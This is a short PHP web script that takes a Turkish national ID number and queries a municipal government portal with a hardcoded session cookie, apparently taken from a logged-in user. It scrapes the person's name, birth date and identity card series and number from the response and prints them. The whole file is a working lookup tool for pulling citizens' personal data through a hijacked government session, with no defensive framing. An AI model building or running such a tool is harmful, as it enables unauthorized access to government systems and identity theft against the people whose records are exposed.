	<form method="post" action="">
	TC: <input type="text" name="tc">
	<input type="submit">
	</form>

<?php


	if(isset($_POST['tc'])) {
		$cookies = "Cookie: LB_canli_belediye_cookie=ffffffff09084a6945525d5f4f58455e445a4a423660; clientTimeOffset=1212; ui-tabs-1=1; JSESSIONID=6fa99cfbb600bfd960ed30e6ff67; serverTime=1648042440797; sessionExpiry=1648044240797";
		$url = "https://canli.belediye.gov.tr/income/takbiz/maliks2?5-1.IBehaviorListener.0-body-form-search&random=0.30110610352213607";
		
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, sprintf("id174_hf_0=&mernisNoSorgu=%s&nviTusu=1", $_POST['tc']));
		
		
		curl_setopt($ch, CURLOPT_HTTPHEADER, array($cookies));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$server_output = curl_exec($ch);
		curl_close ($ch);
		
		preg_match_all('/value="([^"]+)" name="nufusCuzdani:nufusCuzdani.mernisNo"/', $server_output, $matches);
		$tc = $matches[1][0];
		
		preg_match_all('/value="([^"]+)" name="nufusCuzdani:nufusCuzdani.seri"/', $server_output, $matches);
		$seri = $matches[1][0];
		
		preg_match_all('/value="([^"]+)" name="nufusCuzdani:nufusCuzdani.seriNo"/', $server_output, $matches);
		$serino = $matches[1][0];
		
		preg_match_all('/value="([^"]+)" name="nufusCuzdani:nufusCuzdani.adi"/', $server_output, $matches);
		$adi = $matches[1][0];
		
		preg_match_all('/value="([^"]+)" name="nufusCuzdani:nufusCuzdani.soyadi"/', $server_output, $matches);
		$soyadi = $matches[1][0];
		
		preg_match_all('/value="([^"]+)" name="nufusCuzdani:nufusCuzdani.dogumTarihi"/', $server_output, $matches);
		$dogumTarihi = $matches[1][0];
		
		
		
		
		echo $tc . " " . $adi . " " . $soyadi . " " . $dogumTarihi . " " . $seri . " " . $serino ;
	}
?>